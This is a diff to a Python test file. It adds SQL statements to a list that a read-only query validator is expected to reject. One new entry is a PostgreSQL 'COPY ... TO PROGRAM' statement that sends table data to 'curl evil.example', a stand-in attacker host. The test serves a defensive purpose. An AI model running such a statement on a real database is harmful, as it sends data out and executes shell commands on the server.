@@ -49,6 +49,8 @@ def test_other_read_only_queries_pass(sql):
         "TRUNCATE cafes",
         "CREATE TABLE t (i int)",
         "GRANT ALL ON cafes TO PUBLIC",
+        "COPY cafes TO '/tmp/x'",
+        "COPY (SELECT * FROM cafes) TO PROGRAM 'curl evil.example'",
     ],
 )
 def test_write_and_ddl_statements_are_rejected(sql):
